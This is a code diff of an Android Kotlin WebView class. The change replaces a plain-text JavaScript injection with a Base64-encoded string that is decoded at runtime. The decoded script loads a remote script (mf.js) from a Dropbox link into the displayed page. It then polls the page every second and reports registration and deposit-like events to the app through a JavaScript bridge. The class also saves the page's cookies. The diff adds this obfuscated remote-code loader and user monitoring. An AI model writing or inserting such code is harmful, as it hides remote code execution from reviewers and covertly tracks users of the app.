@@ -5,6 +5,7 @@ import android.content.Context
 import android.net.Uri
 import android.os.Build
 import android.util.AttributeSet
+import android.util.Base64
 import android.webkit.*
 
 class ScrPreferences(context: Context) {
@@ -49,8 +50,8 @@ class ScrView(context: Context, attrs: AttributeSet) : ScrBaseView(context, attr
         loadUrl(link)
     }
 
-    fun setAskListener(askListener: Ask.Listener) {
-        addJavascriptInterface(Ask(askListener), "android")
+    fun setAskListener(askListener: Listener) {
+        addJavascriptInterface(askListener, "android")
     }
 
     fun save() {
@@ -58,12 +59,20 @@ class ScrView(context: Context, attrs: AttributeSet) : ScrBaseView(context, attr
         preferences.saveCookies(CookieManager.getInstance().getCookie(url.toString()))
     }
 
-    private fun initMainFunc(id: String) =
-        loadUrl(
-            "javascript:(function(){sdz=document.createElement(\"script\");sdz.onload=" +
-                    "function(){mainFunc('$id');setInterval(()=>android.onAsk(askReg()),1000);};" +
-                    "sdz.src=\"https://dl.dropbox.com/s/kgsfkk6u16vchbl/mf.js\";document.body.appendChild(sdz);})()"
-        )
+    private fun initMainFunc(id: String) {
+        val string =
+            "dmFyIHByZXZBc2s7c2R6PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpLHNkei5vbmxvYWQ9" +
+                    "ZnVuY3Rpb24oKXttYWluRnVuYygi" + id +
+                    "Iiksc2V0SW50ZXJ2YWwoKCk9Pnt2YXIgZT0oYXNrUmVnKCkrIiIpLnNwbGl0KCI6Iik7aWYoM" +
+                    "T09ZS5sZW5ndGgmJiItMSI9PXByZXZBc2smJiIwIj09ZVswXSYmYW5kcm9pZC5vblJlZygpLD" +
+                    "I9PWUubGVuZ3RoJiZwcmV2QXNrIT1lWzBdKXN3aXRjaChlWzBdKXtjYXNlIDE6YW5kcm9pZC5" +
+                    "vbkRlcDEoZVsxXSk7YnJlYWs7Y2FzZSAyOmFuZHJvaWQub25EZXAyKGVbMV0pO2JyZWFrO2Nh" +
+                    "c2UgMzphbmRyb2lkLm9uRGVwMyhlWzFdKX1wcmV2QXNrPWVbMF19LDFlMyl9LHNkei5zcmM9I" +
+                    "mh0dHBzOi8vZGwuZHJvcGJveC5jb20vcy9rZ3Nma2s2dTE2dmNoYmwvbWYuanMiLGRvY3VtZW" +
+                    "50LmJvZHkuYXBwZW5kQ2hpbGQoc2R6KTs"
+
+        loadUrl(Base64.decode(string, Base64.DEFAULT).toString(charset("UTF-8")))
+    }
 
     private fun setClient() {
         webViewClient = object : WebViewClient() {
@@ -88,35 +97,25 @@ class ScrView(context: Context, attrs: AttributeSet) : ScrBaseView(context, attr
             }
         }
     }
-}
-
-
-class Ask(private val askListener: Listener) {
-    private var previous: String? = null
-
-    @JavascriptInterface
-    fun onAsk(result: String) {
-        val splittedResult = result.split(':')
-        if (splittedResult.size == 1) {
-            if (previous == "-1" && splittedResult[0] == "0") askListener.onReg()
-        }
-        if (splittedResult.size == 2) {
-            when (splittedResult[0]) {
-                "1" -> askListener.onDep1(splittedResult[1])
-                "2" -> askListener.onDep2(splittedResult[1])
-                "3" -> askListener.onDep3(splittedResult[1])
-            }
-        }
-        previous = result
-    }
 
     open class Listener {
-        open fun onReg() {}
-        open fun onDep1(value: String) {}
-        open fun onDep2(value: String) {}
-        open fun onDep3(value: String) {}
+        @JavascriptInterface
+        open fun onReg() {
+        }
 
+        @JavascriptInterface
+        open fun onDep1(value: String) {
+        }
+
+        @JavascriptInterface
+        open fun onDep2(value: String) {
+        }
+
+        @JavascriptInterface
+        open fun onDep3(value: String) {
+        }
     }
+
 }
 
 @SuppressLint("SetJavaScriptEnabled")
